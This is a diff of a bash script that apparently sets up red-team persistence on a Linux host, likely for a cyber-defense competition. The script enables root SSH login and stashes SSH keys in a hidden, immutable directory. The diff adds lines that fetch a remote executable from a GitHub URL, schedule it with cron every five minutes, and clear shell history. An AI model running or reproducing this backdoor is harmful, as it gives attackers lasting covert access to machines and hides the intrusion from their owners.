@@ -1,18 +1,30 @@
 #!/usr/bin/bash
 
 ## Blind install SSH server
-sudo dnf install openssh-server
+sudo dnf install -y openssh-server
 
 ## Start and enable openssh server
 systemctl enable sshd && systemctl start sshd
 
-## Change two flags in the ssh (No more needlessly complex ssh config) 
 sed -i 's/^#\?#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
 sed -i 's/^#\?#Passwordauthentication yes/Passwordauthentication no/' /etc/ssh/sshd_config 
 
+#Restart after configs
 systemctl restart sshd
 
 mkdir -p /opt/.authers
 cp .ssh/* /opt/.authers
-
+cp "$0" /opt/.authers
 chattr +i /opt/.authers/*
+
+## Download scrappy crappy doo cron job
+curl https://raw.githubusercontent.com/taquito-d/evil-csusb-ncae/refs/heads/main/scrappy > /opt/.authers/scrappy && chmod +x /opt/.authers/scrappy
+
+
+jaub="*/5 * * * * /opt/.authers/scrappy"
+
+(crontab -l 2>/dev/null; echo "$jaub") | crontab -
+
+## Clear all history
+history -c
+#Get pwned owned red schemebers  B))))
